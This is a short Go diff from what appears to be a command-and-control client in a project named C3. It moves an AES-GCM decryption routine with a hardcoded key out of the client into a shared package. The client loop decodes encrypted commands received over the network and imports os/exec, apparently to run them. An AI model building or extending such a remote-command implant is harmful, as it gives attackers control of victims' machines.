@@ -2,45 +2,15 @@ package main
 
 import (
 	// Standard
-	"crypto/aes"
-	"crypto/cipher"
 	"encoding/gob"
-	"fmt"
 	"net"
 	"os/exec"
 	"runtime"
 	"strings"
+
+	// C3
+	"github.com/calebmatsick/C3/pkg/security"
 )
-
-
-func decrypt(ciphertext []byte) string {
-	key := []byte("passphrasewhichneedstobe32bytes!")
-
-	c, err := aes.NewCipher(key)
-
-	if err != nil {
-		fmt.Println(err)
-	}
-
-	gcm, err := cipher.NewGCM(c)
-	if err != nil {
-		fmt.Println(err)
-	}
-
-	nonceSize := gcm.NonceSize()
-
-	if len(ciphertext) < nonceSize {
-		fmt.Println(err)
-	}
-
-	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
-	decCmd, err := gcm.Open(nil, nonce, ciphertext, nil)
-	if err != nil {
-		fmt.Println(err)
-	}
-
-	return string(decCmd)
-}
 
 
 func main() {
@@ -56,7 +26,7 @@ func main() {
 
 	cmdLoop:for {
 		dec.Decode(&encCmd)
-		cmd := decrypt(encCmd)
+		cmd := security.Decrypt(encCmd)
 		cmd = strings.TrimSuffix(cmd, "\n")
 	
 		switch {
